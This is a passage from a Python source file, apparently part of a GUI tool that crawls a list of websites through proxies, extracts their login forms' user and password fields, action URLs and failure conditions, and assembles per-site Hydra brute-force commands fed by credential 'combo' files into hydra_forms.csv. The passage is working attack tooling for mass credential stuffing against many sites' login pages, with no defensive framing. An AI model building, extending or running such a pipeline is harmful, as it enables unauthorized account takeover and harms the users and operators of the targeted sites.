                            urls_to_try.append(f"{clean_base}{path}")

                    error_info = {"status": "fetch_failed", "error_message": "unknown"}
                    for url in urls_to_try:
                        if not url:
                            continue
                        form_data, error_info = extract_login_form(
                            url,
                            proxy,
                            strict_validation=self.strict_validation.get(),
                            mode=str(config.get("analysis_mode", "static") or "static"),
                            observation_options={
                                "enable_dummy_interaction": bool(config.get("observation_enable_dummy_interaction", False)),
                                "allowlisted_domains": config.get("observation_allowlisted_domains", []) or [],
                            },
                        )
                        if form_data:
                            return {"status": form_data.get("status", "success_loginish"), "form": form_data, "used_url": url}

                        if isinstance(error_info, dict) and error_info.get("status") == "skipped_invalid_target":
                            return error_info
                        if isinstance(error_info, dict) and error_info.get("status") == "fetch_failed":
                            continue
                        if isinstance(error_info, dict) and error_info.get("status") == "no_form":
                            continue

                    rotation_counter += 1
                    return error_info if isinstance(error_info, dict) else {"status": "fetch_failed", "error_message": str(error_info or "unknown")}

                with ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
                    future_to_base = {executor.submit(extract_for_site, base): base for base in site_list}
                    for i, future in enumerate(as_completed(future_to_base), 1):
                        if self.cancel_event.is_set():
                            self.cleanup_after_pipeline("Cancelled during extraction")
                            return

                        if self.wait_if_paused_or_cancelled():
                            self.cleanup_after_pipeline("Cancelled while paused")
                            return

                        base = future_to_base[future]
                        entry = self.processed_data.setdefault(base, {})
                        now = datetime.now().isoformat()
                        entry.setdefault("first_seen_ts", now)
                        entry["last_checked_ts"] = now
                        try:
                            outcome = future.result() or {"status": "fetch_failed", "error_message": "unknown"}
                            status = outcome.get("status")
                            if status in {"success_form", "success_loginish"}:
                                form = outcome["form"]
                                form['base_url'] = base
                                form['combo_file'] = get_site_filename(base)
                                if form.get('hydra_command_template'):
                                    form['full_hydra_command'] = form['hydra_command_template'].replace("{{combo_file}}", get_site_filename(base))
                                    results.append(form)
                                entry.update({
                                    "status": status,
                                    "form_found": status == "success_form",
                                    "last_error_code": None,
                                    "last_error_hint": None,
                                    "last_error_detail": None,
                                    "last_error_stacktrace": None,
                                    "hydra_command_template": form.get("hydra_command_template", ""),
                                    "extracted": {
                                        "page_url": form.get("original_url"),
                                        "action_url": form.get("action_url") or form.get("action"),
                                        "method": form.get("method", "unknown"),
                                        "user_field": form.get("user_field"),
                                        "pass_field": form.get("pass_field"),
                                        "other_fields": form.get("post_data", ""),
                                        "confidence": form.get("confidence"),
                                        "reasons": form.get("reasons"),
                                        "submit_mode": form.get("submit_mode", "unknown"),
                                        "classification": form.get("classification"),
                                        "login_metadata": form.get("login_metadata", {}),
                                        "observed_login_flow": form.get("observed_login_flow"),
                                    },
                                })
                                reason = form.get('validation_reason') or form.get('reasons') or 'ok'
                                self._write_log_threadsafe(f"{base} :: status={status} confidence={form.get('confidence', 0)} reason={reason}")
                            elif status == "skipped_invalid_target":
                                reason = outcome.get('reason', 'invalid target')
                                entry.update({"status": "skipped_invalid_target", "form_found": False, "last_error_code": "invalid_target", "last_error_hint": reason, "last_error_detail": reason})
                                self._write_log_threadsafe(f"{base} :: status=skipped_invalid_target confidence=0 reason={reason}")
                            elif status == "no_form":
                                reason = outcome.get('reason', 'no matching form')
                                entry.update({"status": "no_form", "form_found": False, "last_error_code": None, "last_error_hint": None, "last_error_detail": None})
                                self._write_log_threadsafe(f"{base} :: status=no_form ❌ no login form confidence=0 reason={reason}")
                            else:
                                code = outcome.get("error_code") or "fetch_failed"
                                hint = outcome.get("error_hint") or outcome.get("hint") or "Navigation failed"
                                detail = outcome.get("error_detail") or outcome.get("error_message") or "fetch failed"
                                stacktrace = outcome.get("error_stacktrace")
                                entry.update({"status": "fetch_failed", "form_found": False, "last_error_code": code, "last_error_hint": hint, "last_error_detail": detail, "last_error_stacktrace": stacktrace})
                                extra = f" detail={detail}" if self.show_debug_details.get() else ""
                                if self.show_debug_details.get() and stacktrace:
                                    extra += f" stack={stacktrace.splitlines()[-1]}"
                                self._write_log_threadsafe(f"{base} :: status=fetch_failed confidence=0 reason={hint}{extra}")

                            entry["combo_count"] = self.processed_data.get(base, {}).get('combo_count', 0)
                        except Exception as e:
                            if bool(config.get("debug_logging", False)):
                                logger.debug(f"Thread error for {base}: {e}")

                        self._update_progress_threadsafe(value=i)
                        self._update_status_threadsafe(f"Extracting: {i}/{total}")

                self._show_progress_threadsafe(False)

                if results:
                    keys = ['original_url', 'base_url', 'used_url', 'used_type', 'action', 'post_data',
                            'failure_condition', 'hydra_command_template', 'combo_file', 'full_hydra_command', 'confidence', 'validation_reason']
                    with forms_path.open("w", newline="", encoding="utf-8") as f:
                        writer = csv.DictWriter(f, fieldnames=keys)
                        writer.writeheader()
                        writer.writerows(results)
                    self._write_log_threadsafe(f"Found {len(results)} validated forms → {forms_path}")

                self._write_log_threadsafe("Updated processed_sites.json")
                self.save_processed_data()

            self.cleanup_after_pipeline("Pipeline complete! Check per-site files and hydra_forms.csv")

        except Exception as e:
            self.cleanup_after_pipeline(f"Pipeline failed: {str(e)}")
